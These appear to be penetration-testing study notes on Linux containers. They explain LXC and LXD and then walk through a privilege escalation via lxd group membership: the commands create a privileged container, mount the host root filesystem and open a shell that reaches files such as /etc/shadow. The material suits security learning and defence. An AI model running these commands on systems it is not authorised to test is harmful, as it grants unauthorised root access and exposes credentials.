### Containers vs. Virtual Machines
- **Containers** operate at the **OS level** — share the host kernel, isolate application processes.
- **VMs** operate at the **hardware level** — run multiple full OSes simultaneously.
- Isolation/virtualization purpose: efficient resource management, security boundary enforcement, easier fault isolation, and containing processes that need elevated privileges (e.g. web apps/APIs isolated from the host to prevent escalation to backend databases).

---

## Linux Containers (LXC)
- OS-level virtualization — multiple isolated Linux systems run on one host, each with its own processes but **sharing the host kernel**.
- Lightweight vs. VMs — lower resource consumption, standardized management interface, portable across clouds.
- Docker's popularity drove the broader LXC ecosystem/tooling.
- Full lifecycle (template creation → deployment → OS/network config → app deployment) follows a consistent workflow.

## Linux Daemon (LXD)
- Similar to LXC but designed as a **system container** (full OS), not just an application container.
- **Prerequisite for exploitation:** current user must be in the `lxc` or `lxd` group.

```bash
id
# uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

---

## LXD Group PrivEsc — Exploitation Path

**Concept:** If in the `lxd` group, you can create/import a container and configure it with **`security.privileged=true`**, which disables container isolation — allowing access to the host filesystem as root from inside the container.

### Option A: Use an existing container template
Admins sometimes leave insecure/unauthenticated templates lying around:
```bash
cd ContainerImages
ls
# ubuntu-template.tar.xz
```

### Step 1 — Import the image
```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

### Step 2 — Init container with privileged flag + mount host root
```bash
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
- `security.privileged=true` → disables isolation features that would otherwise block host access.
- Mounts the **entire host filesystem** (`/`) into the container at `/mnt/root`.

### Step 3 — Start and enter the container
```bash
lxc start privesc
lxc exec privesc /bin/bash
```

Note: Could be /bin/sh. Just depends on the shell

### Step 4 — Access host filesystem as root
```bash
ls -l /mnt/root
```
- Inside the container (running as root), `/mnt/root` now exposes the **full host filesystem** — including `/etc/shadow`, root's home dir, etc. — effectively granting root-level host access.

---

**Key takeaway:** Being in the `lxc`/`lxd` group is functionally equivalent to root on the host, due to the ability to spin up a privileged container with the host filesystem mounted in.